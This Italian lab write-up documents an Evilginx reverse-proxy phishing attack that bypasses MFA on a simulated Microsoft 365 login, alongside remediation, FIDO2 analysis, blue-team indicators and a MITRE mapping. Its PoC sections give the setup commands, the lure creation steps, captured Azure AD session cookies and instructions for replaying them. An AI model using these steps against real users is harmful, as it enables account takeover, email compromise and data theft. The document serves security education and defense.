> [English](README.en.md) | **Italiano**

# Evilginx - MFA Bypass via Reverse Proxy Phishing

> - **Fase:** Social Engineering - Advanced Phishing with MFA Bypass
> - **Visibilita:** Media - il traffico TLS tra vittima e Evilginx proxy e legittimo in apparenza; tuttavia il dominio di phishing e rilevabile tramite Certificate Transparency logs, DNS monitoring e analisi del doppio TLS handshake
> - **Prerequisiti:** Evilginx 3.x installato; dominio controllato dall'attaccante con gestione DNS (record A/CNAME); certificato TLS (Let's Encrypt automatico o manuale); phishlet configurato per il servizio target (Microsoft 365, Google, Okta)
> - **Output:** SE-002 (MFA bypass via reverse proxy session hijacking - severity Critico); session cookie del servizio target catturato post-autenticazione MFA completa

- **Ambiente Operativo:** Kali Linux Purple (Attaccante + Evilginx Server), Windows VM (Vittima con browser)
- **Target:** Microsoft 365 login (simulato in ambiente lab)
- **Framework:** Evilginx 3.3
- **Tecniche Documentate:** Reverse Proxy Phishing, Session Cookie Hijacking, MFA Bypass

---

## Executive Summary

Evilginx rappresenta l'evoluzione piu significativa nel panorama del phishing dal 2022 ad oggi. Mentre il phishing tradizionale (GoPhish, PyPhisher) cattura solo username e password - rendendo l'MFA una difesa efficace - Evilginx opera come un reverse proxy trasparente tra la vittima e il servizio legittimo, intercettando i session cookie emessi dopo il completamento dell'intero flusso di autenticazione, incluso il secondo fattore (OTP, push notification, authenticator app).

Il principio e semplice: la vittima interagisce con il servizio reale (vede la vera interfaccia Microsoft 365, il vero challenge MFA), ma tutto il traffico transita attraverso il proxy Evilginx. Al termine dell'autenticazione, il servizio emette un session cookie che Evilginx cattura prima di inoltrarlo al browser della vittima. L'attaccante puo quindi importare questo cookie nel proprio browser per accedere all'account senza conoscere la password e senza dover ripetere l'MFA.

Questa tecnica ha reso obsoleti i phishing kit tradizionali per target con MFA abilitato, e ha spinto l'industria verso l'adozione di FIDO2/WebAuthn come unica contromisura efficace.

---

## MFA Bypass: Session Cookie Hijacking via Reverse Proxy

**ID Finding:** `SE-002` | **Severity:** `Critico`

### Contesto operativo

Il laboratorio ha configurato Evilginx con un phishlet per Microsoft 365, utilizzando un dominio di test (`login.lab.local`) con certificato TLS self-signed. La vittima (VM Windows con browser Chrome) ha visitato l'URL di phishing, completato il login con username + password + codice OTP, e il session cookie e stato intercettato in tempo reale. L'attaccante ha poi importato il cookie nel proprio browser per accedere all'account senza ulteriore autenticazione.

### PoC - Fase 1: Installazione e Configurazione Base

```Bash
# Installazione Evilginx
sudo apt install evilginx2
# oppure build da sorgente (consigliato per versione 3.x)
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make
sudo ./build/evilginx -p ./phishlets -developer
# Flag -developer: disabilita controlli DNS per testing locale
```

```Bash
# Configurazione dominio e IP (console Evilginx)
config domain lab.local
config ipv4 192.168.0.110
```

```
[inf] server domain set to: lab.local
[inf] server external IP set to: 192.168.0.110
```

### PoC - Fase 2: Configurazione Phishlet

```Bash
# Abilitazione phishlet Microsoft 365
phishlets hostname o365 login.lab.local
phishlets enable o365
```

```
[inf] setting up phishlet 'o365'
[inf] hostname for phishlet 'o365' set to: login.lab.local
[inf] enabled phishlet 'o365'                                      <-- phishlet attivo
[inf] setting up SSL/TLS certificates for domain: login.lab.local
[inf] certificates successfully installed                           <-- TLS pronto
```

### PoC - Fase 3: Creazione Lure (URL di Phishing)

```Bash
# Creazione URL di phishing
lures create o365
lures edit 0 redirect_url https://outlook.office.com
lures get-url 0
```

```
https://login.lab.local/NeKzw3E                                   <-- URL da inviare alla vittima
```

### PoC - Fase 4: Vittima Completa il Login MFA

La vittima riceve l'URL (via email, messaggio, o qualsiasi canale di delivery) e lo visita nel browser. La pagina visualizzata e il vero portale Microsoft 365 - non una copia statica, ma il servizio reale proxied da Evilginx. La vittima inserisce username, password, e completa il challenge MFA (codice OTP dall'app Authenticator).

```
# Log Evilginx durante l'autenticazione della vittima
[inf] [o365] new visitor: 192.168.0.120 (Windows 10, Chrome 120)
[inf] [o365] proxying request: POST /common/login                  <-- username+password
[inf] [o365] proxying request: POST /common/SAS/ProcessAuth        <-- MFA challenge
[inf] [o365] proxying request: POST /common/SAS/EndAuth            <-- MFA completato
[!!!] [o365] session captured for: user@target-lab.com             <-- SE-002
[inf] [o365] tokens captured - session cookie saved
[inf] [o365] redirecting to: https://outlook.office.com
```

### PoC - Fase 5: Session Replay

```Bash
# Visualizzazione sessioni catturate
sessions
```

```
+-----+----------+---------------------+----------+-----------------------+
| id  | phishlet | username            | tokens   | landing url           |
+-----+----------+---------------------+----------+-----------------------+
|   1 | o365     | user@target-lab.com | captured | login.lab.local/NeKzw |  <-- SE-002
+-----+----------+---------------------+----------+-----------------------+
```

```Bash
# Export dettagli sessione
sessions 1
```

```
[session 1]
  phishlet:    o365
  username:    user@target-lab.com
  password:    [captured]
  tokens:
    ESTSAUTH=0.AQ4Aj...                    <-- Azure AD session cookie
    ESTSAUTHPERSISTENT=0.AQ4Aj...          <-- persistent session cookie
    ESTSAUTHLIGHT=0.AQ4Aj...
  user-agent:  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0
  remote-ip:   192.168.0.120
  timestamp:   2026-03-15 10:23:45 UTC
```

```Bash
# Importazione cookie nel browser dell'attaccante:
# 1. Installare estensione "Cookie-Editor" in Chrome/Firefox
# 2. Navigare su https://login.microsoftonline.com
# 3. Aprire Cookie-Editor -> Import -> incollare il JSON dei token
# 4. Refresh pagina -> accesso diretto all'account senza login
```

### Remediation

- **Azione immediata:** revoca di tutti i refresh token e session token per l'utente compromesso (`Revoke-AzureADUserAllRefreshToken` in PowerShell, oppure "Revoke sessions" nel portale Azure AD); reset password; verifica nei Sign-in logs per accessi da IP anomali
- **Azione strutturale:** migrazione da OTP/SMS/Push a FIDO2/WebAuthn (hardware security key - YubiKey, Titan Key); FIDO2 e l'unica contromisura efficace perche la challenge crittografica e legata al dominio reale (`login.microsoftonline.com`) e non puo essere completata attraverso un proxy su un dominio diverso (`login.lab.local`). Implementazione Conditional Access con device compliance (Intune), IP-based restrictions, e sign-in risk evaluation (Azure AD Identity Protection)
- **Verifica:** tentativo di session replay dopo la revoca dei token - deve restituire redirect a pagina di login; verifica che hardware security key sia richiesta per tutti gli utenti critici

---

## Esperienza di Laboratorio

L'ambiente di test e stato configurato con Evilginx 3.3 in modalita developer (flag `-developer`) per disabilitare i controlli DNS che avrebbero richiesto un dominio pubblico reale. Il phishlet `o365` e stato configurato per il hostname `login.lab.local`, con risoluzione DNS forzata via file `/etc/hosts` sulla macchina vittima.

La prima difficolta significativa e stata la configurazione TLS. Evilginx richiede un certificato valido per il dominio del phishlet, e in ambiente lab il certificato self-signed ha generato un warning nel browser della vittima ("Your connection is not private"). In un attacco reale, Evilginx utilizza Let's Encrypt per ottenere certificati validi automaticamente, eliminando qualsiasi warning. Per il laboratorio, il warning e stato accettato manualmente per procedere con il test.

Il momento piu istruttivo dell'esercizio e stato osservare il flusso di autenticazione dal punto di vista dei log Evilginx: ogni richiesta HTTP/HTTPS tra la vittima e Microsoft 365 transita attraverso il proxy, ed Evilginx identifica e salva automaticamente i cookie di sessione in base alle regole definite nel phishlet. La vittima non ha alcun modo di distinguere l'esperienza dal login legittimo - l'interfaccia, il challenge MFA, e il redirect finale sono tutti reali.

Un aspetto critico emerso dal test: il session cookie catturato ha una durata limitata (in genere 1-24 ore per Azure AD, configurabile dall'amministratore). L'attaccante deve quindi utilizzare il cookie rapidamente o configurare un meccanismo di refresh automatico. Nelle versioni recenti di Evilginx, il flag `--cookie-jar` permette l'export in formato compatibile con tool di automazione.

---

## Analisi Teorica: Perche l'MFA Non Basta

Il modello di autenticazione web moderno si basa su un presupposto implicito: il browser della vittima comunica direttamente con il servizio di autenticazione. L'MFA aggiunge un secondo fattore (codice OTP, push notification, biometria) che rende insufficiente la sola conoscenza della password. Tuttavia, questo modello non considera lo scenario in cui un proxy trasparente si interponga nella comunicazione.

Evilginx sfrutta una debolezza architetturale fondamentale: i session cookie emessi dopo l'autenticazione MFA sono bearer token - chiunque li possieda puo utilizzarli, indipendentemente da chi ha completato l'autenticazione. Il proxy intercetta questi token prima che raggiungano il browser della vittima, li salva, e poi li inoltra normalmente. La vittima accede al servizio come previsto; l'attaccante ha una copia del suo accesso.

L'unica contromisura realmente efficace e FIDO2/WebAuthn. A differenza di OTP e push notification, FIDO2 lega la challenge crittografica al dominio specifico: la hardware security key firma una challenge che include l'origin del sito (`https://login.microsoftonline.com`). Se il browser e connesso a un dominio diverso (`https://login.lab.local`, il proxy Evilginx), la firma crittografica fallisce e l'autenticazione non puo essere completata. Questo principio si chiama "origin binding" ed e la ragione per cui le principali organizzazioni di sicurezza (CISA, NIST) raccomandano la migrazione a FIDO2 come priorita.

---

## Scenario Reale: Proiezione Post-Exploitation

> Questa sezione descrive come questo finding si inserirebbe in un engagement reale, sia dal punto di vista dell'attaccante (Red Team) che del difensore (Blue Team).

### Prospettiva Attaccante (Red Team)

**Punto di partenza:** session cookie Azure AD catturato per un utente con MFA abilitato (SE-002). Accesso completo alla casella email e ai servizi Microsoft 365 dell'utente.

**Passo successivo immediato:** accesso a Outlook Web App per leggere email sensibili, identificare contatti chiave, e preparare un attacco BEC (Business Email Compromise) dall'account compromesso.

**Kill Chain proiettata:**

```
[SE-002] Session cookie catturato (accesso M365)
        |
        v
Email access -> lettura email sensibili, identificazione catena di comando
        |
        v
BEC (Business Email Compromise) -> invio email interne da account trusted
        |
        v
SharePoint/OneDrive access -> esfiltrazione documenti riservati
        |
        v
Conditional Access bypass (device trusted) -> accesso VPN aziendale
        |
        v
Internal network -> lateral movement via AD, Domain Admin
```

**Impatto potenziale:** compromissione completa dell'identita digitale dell'utente. Il session hijacking via Evilginx e particolarmente insidioso perche bypassa il controllo di sicurezza che la maggior parte delle organizzazioni considera sufficiente (MFA). L'attaccante opera con le stesse autorizzazioni dell'utente legittimo, rendendo il rilevamento estremamente difficile senza analisi comportamentale (UEBA).

### Prospettiva Difensore (Blue Team)

**IOC da monitorare:**
- Certificate Transparency logs: monitorare emissione certificati per domini simili al proprio (es. `login-company.com`, `company-portal.net`)
- DNS anomali: query verso domini typosquatting del proprio login portal
- Sign-in logs: login da IP/geolocalizzazione anomala immediatamente dopo un login legittimo (pattern di session replay)
- Token usage patterns: utilizzo di session token da User-Agent o IP diverso da quello originale
- Impossible travel: login da due localita geograficamente distanti in finestra temporale incompatibile

**Contenimento immediato:**
- Revoca di tutti i refresh token e session token (`Revoke-AzureADUserAllRefreshToken`)
- Reset password
- Verifica regole di inoltro email (IOC di persistence comune post-BEC)
- Audit dei file SharePoint/OneDrive acceduti nelle ultime 72 ore
- Verifica Conditional Access: l'accesso da dispositivo non gestito dovrebbe essere bloccato

**Hardening:**
- Migrazione a FIDO2/WebAuthn per tutti gli utenti (priorita: admin, C-level, finance)
- Continuous Access Evaluation (CAE) in Azure AD: revoca token in near-real-time
- Token binding: legare il session token al dispositivo specifico (feature in preview in Azure AD)
- DNS sinkholing dei domini Evilginx noti (feed threat intelligence)
- Monitoraggio Certificate Transparency per il proprio brand

---

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Resource Development | Acquire Infrastructure: Domains | `T1583.001` | Registrazione dominio di phishing per Evilginx proxy (`login.lab.local`) |
| Resource Development | Obtain Capabilities: Tool | `T1588.002` | Utilizzo framework Evilginx 3.x con phishlet Microsoft 365 |
| Initial Access | Phishing: Spearphishing Link | `T1566.002` | Invio URL lure Evilginx alla vittima (SE-002) |
| Execution | User Execution: Malicious Link | `T1204.001` | La vittima clicca il link e completa il login MFA attraverso il proxy |
| Credential Access | Steal Web Session Cookie | `T1539` | Intercettazione session cookie Azure AD post-autenticazione MFA (SE-002) |
| Credential Access | Adversary-in-the-Middle | `T1557` | Evilginx opera come proxy trasparente tra vittima e servizio Microsoft 365 |
| Defense Evasion | Use Alternate Authentication Material: Web Session Cookie | `T1550.004` | Replay del session cookie catturato per accesso senza password/MFA |
| Collection | Data from Information Repositories: Sharepoint | `T1213.002` | Accesso a documenti SharePoint/OneDrive tramite sessione hijacked |
| Collection | Email Collection: Remote Email Collection | `T1114.002` | Lettura casella email Outlook Web App della vittima |

---

> **Nota:** Tutte le attivita documentate sono state condotte in un ambiente di laboratorio virtualizzato (VirtualBox, rete NAT/Bridge isolata) con Evilginx in modalita developer. Il phishlet e stato configurato per un dominio locale di test, non per un servizio Microsoft 365 reale. Nessuna credenziale o sessione di utenti reali e stata intercettata. Le tecniche sono documentate a scopo educativo e di awareness sulla necessita di FIDO2/WebAuthn.
